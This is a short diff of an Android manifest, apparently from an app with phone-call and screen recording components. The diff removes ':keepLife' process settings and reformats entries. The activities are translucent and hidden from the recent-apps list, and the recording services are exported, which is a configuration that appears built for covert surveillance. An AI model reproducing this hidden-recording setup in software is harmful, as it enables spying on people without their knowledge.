@@ -56,7 +56,6 @@
         <activity android:name="com.view.core.activitys.PhoneRecordActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:excludeFromRecents="true"
-            android:process=":keepLife"
             >
 <!--            <intent-filter>-->
 <!--                <action android:name="android.intent.action.MAIN" />-->
@@ -68,7 +67,6 @@
         <activity android:name="com.view.core.activitys.ScreenRecordActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:excludeFromRecents="true"
-            android:process=":keepLife"
             >
 <!--            <intent-filter>-->
 <!--                <action android:name="android.intent.action.MAIN" />-->
@@ -88,20 +86,21 @@
         <service android:name="com.view.core.services.SocketService"
             android:enabled="true"
             android:exported="false"
-            android:process=":keepLife"
             ></service>
 
         <service
             android:name="com.view.core.services.PhoneRecordService"
             android:enabled="true"
-            android:exported="true"></service>
+            android:exported="true"
+            ></service>
 
 
 
         <service
             android:name="com.view.core.services.ScreenRecordService"
             android:enabled="true"
-            android:exported="true"></service>
+            android:exported="true"
+            ></service>
 
         <service
             android:name="com.view.core.services.MessageCenterService$KernelService"
